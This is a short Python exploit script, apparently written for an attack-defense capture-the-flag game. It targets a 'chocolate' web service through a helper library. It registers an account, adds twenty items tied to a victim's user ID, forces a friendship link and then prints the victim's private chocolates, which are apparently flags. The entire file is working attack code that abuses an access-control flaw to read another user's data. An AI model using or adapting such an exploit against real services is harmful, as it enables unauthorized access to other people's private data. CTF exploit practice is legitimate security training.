import sys
from choco_lib import *

if len(sys.argv) < 3:
	print('Usage: python3 sploit.py ip user_id')
	exit(0)

ip = sys.argv[1]
uid = sys.argv[2]


mch = CheckMachine(ip)

username, password = mch.register_user()
sess = mch.login_user(username, password)

for i in range(20):
	mch.add_wrapper(sess, 'kek', uid)


mch.make_friends(sess, uid, ['kek'])
chocs, _ = mch.get_user_chocolates(sess, uid)
print(chocs)

for choc in chocs:
	print(mch.get_chocolate(sess, choc))